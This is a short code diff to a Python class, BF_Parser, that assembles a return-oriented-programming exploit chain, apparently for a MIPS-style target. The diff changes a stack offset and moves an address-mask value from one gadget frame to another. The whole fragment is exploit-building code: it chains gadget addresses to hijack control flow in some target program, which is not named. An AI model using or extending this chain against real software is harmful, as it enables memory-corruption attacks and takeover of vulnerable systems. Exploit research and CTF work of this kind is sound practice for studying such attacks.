@@ -246,7 +246,8 @@ class BF_Parser():
                       self.__move_sp.get_frame_size() + \
                       self.__copy_a3.get_frame_size() + \
                       self.__mov_a4_a3.get_frame_size() + \
-                      0x18 # offset for s3
+                      self.__mov_a0_a4.get_frame_size() + \
+                      0x48 # offset for s3
 
         rop_chain = self.__pop_s0.construct_frame(ra=self.__move_sp.get_vaddr(),
                                                   s0=sp + self.__pop_s0.get_frame_size() + 0x50 \
@@ -262,12 +263,11 @@ class BF_Parser():
 
         rop_chain += self.__mov_a4_a3.construct_frame(ra=self.__mov_a0_a4.get_vaddr())
 
-        rop_chain += self.__mov_a0_a4.construct_frame(ra=self.__charger.get_vaddr(), \
-                                                      s3=self.__addr_mask # will contain address written at runtime
-                                                      )
+        rop_chain += self.__mov_a0_a4.construct_frame(ra=self.__charger.get_vaddr())
 
         rop_chain += self.__charger.construct_frame(ra=self.__load_s0.get_vaddr(), \
-                                                    s4=self.__mov_a0_s0.get_vaddr()
+                                                    s4=self.__mov_a0_s0.get_vaddr(), \
+                                                    s3=self.__addr_mask # will contain address written at runtime
                                                     )
 
         rop_chain += self.__mov_a0_s0.construct_frame(ra=self.__charger.get_vaddr())
